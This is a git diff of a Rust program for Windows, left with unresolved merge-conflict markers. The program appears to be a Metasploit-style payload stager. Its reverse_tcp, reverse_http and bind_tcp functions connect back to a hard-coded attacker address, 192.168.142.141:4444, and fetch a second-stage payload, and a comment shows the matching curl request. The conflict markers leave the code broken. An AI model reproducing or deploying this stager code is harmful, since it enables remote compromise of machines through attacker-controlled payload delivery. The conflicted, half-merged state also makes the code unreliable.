@@ -6,9 +6,14 @@ use std::io::Cursor;
 use std::os::windows::prelude::*;
 use std::{error::Error, u32};
 use tokio::io::AsyncReadExt;
+<<<<<<< HEAD
 use tokio::net::{TcpListener, TcpStream};
+=======
+use tokio::net::TcpStream;
+
+>>>>>>> 00e6874a54594ccecc799dff3b49fa4302f099e3
 async fn reverse_tcp(address: &str) -> Result<(), Box<dyn Error>> {
-    let mut stream = TcpStream::connect("192.168.142.141:4444").await?;
+    let mut stream = TcpStream::connect(address).await?;
     let mut stage2_len_buf = [0u8; 4];
     stream.read_exact(&mut stage2_len_buf).await?;
     dbg!(stage2_len_buf);
@@ -95,12 +100,16 @@ fn gen_uri_checksum(length: u32) -> String {
 use std::time::Duration;
 // GET /BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8 HTTP/1.1
 // curl http://192.168.142.141:4444/BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8
-async fn reverse_http() -> Result<(), Box<dyn Error>> {
+async fn reverse_http(url: &str) -> Result<(), Box<dyn Error>> {
     //  # Choose a random URI length between 30 and 255 bytes
     // lib\msf\core\payload\windows\x64\reverse_http_x64.rb#L109
     let checksum = gen_uri_checksum(30);
+<<<<<<< HEAD
     let url = concat!("https://192.168.142.141:4444", "/").to_owned();
     let url = format!("{}{}", url, checksum);
+=======
+    let url = format!("{}/{}", url, checksum);
+>>>>>>> 00e6874a54594ccecc799dff3b49fa4302f099e3
     dbg!(&url);
     let five_seconds = Duration::new(5, 0);
     let client = reqwest::ClientBuilder::new()
@@ -122,9 +131,14 @@ async fn reverse_http() -> Result<(), Box<dyn Error>> {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
+<<<<<<< HEAD
     // reverse_tcp("").await?;
     // reverse_http().await?;
     bind_tcp("0.0.0.0:4446").await?;
+=======
+    // reverse_tcp("192.168.142.141:4444").await?;
+    reverse_http("http://192.168.142.141:4444").await?;
+>>>>>>> 00e6874a54594ccecc799dff3b49fa4302f099e3
     return Ok(());
 }
 
